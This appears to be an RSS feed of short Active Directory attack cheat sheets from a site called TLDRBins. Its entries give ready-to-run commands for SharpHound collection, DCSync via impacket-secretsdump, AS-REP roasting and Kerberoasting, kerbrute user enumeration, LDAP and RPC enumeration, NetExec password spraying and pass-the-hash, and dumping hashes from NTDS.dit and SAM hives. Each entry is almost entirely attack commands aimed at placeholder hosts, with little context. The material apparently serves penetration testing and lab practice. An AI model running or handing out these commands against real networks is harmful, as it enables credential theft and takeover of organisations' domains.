channel.title: Ad on TLDRBins
channel.description: Recent content in Ad on TLDRBins

item.title: Bloodhound
item.description: sharphound.ps1 Download sharphound.ps1 # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All

item.title: GetChanges/GetChangesAll
item.description: GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10

item.title: Kerberoasting
item.description: AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password

item.title: Kerberos
item.description: Kerbrute Download kerbrute kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .

item.title: LDAP
item.description: Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u 'example.com\username' -p 'passowrd' 10.10.11.10 -o ./ldap

item.title: NetExec (nxc)
item.description: nxc Download nxc SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash

item.title: RPC
item.description: RPC rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U domain/username 10.10.11.10 # Commands querydispinfo enumdomusers

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
